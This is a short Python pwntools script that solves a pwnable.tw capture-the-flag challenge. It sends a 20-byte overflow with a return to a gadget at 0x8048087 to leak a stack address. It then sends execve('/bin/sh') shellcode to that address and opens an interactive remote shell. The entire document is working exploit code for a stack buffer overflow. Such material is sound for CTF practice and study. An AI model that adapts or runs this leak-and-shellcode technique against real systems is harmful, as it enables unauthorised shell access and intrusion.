#!/usr/bin/env python
#   WildfootW 2018
#   https://github.com/Wildfoot
#

from pwn import *
import time

context.update(arch="i386", os="linux")

host = "127.0.0.1"
port = 8888
host = "chall.pwnable.tw"
port = 10000
r = remote(host, port)

mov_ecx_esp_cts = 0x8048087

input("attach in gdb and press Enter")

payload = flat(["A" * 20, mov_ecx_esp_cts])

print(payload)

r.recvuntil(":")
#r.sendline(payload)
#Tip: \n will cover over esp address
r.send(payload)

time.sleep(1)
esp_base = r.recv(512)[0:4]
esp_base = hex(u32(esp_base))
print("esp base address :", esp_base)

# payload
# ---- ---- ---- ---- ---- ret_address ---- ---- ---- ---- ---- ---- ---- ---- ----
#      ^[esp base]    ^[esp base + 12]
#payload = flat(["aaaabaaacaaadaaaeaaa", esp_base, "faaagaaahaaaiaaajaaakaaalaaamaaanaaa"])

shellcode = asm(shellcraft.execve("/bin/sh"))
shellcode_address = int(esp_base, 16) + 0x14
payload = flat(["A" * 20, shellcode_address, shellcode])
print(payload)
r.send(payload)

r.interactive()

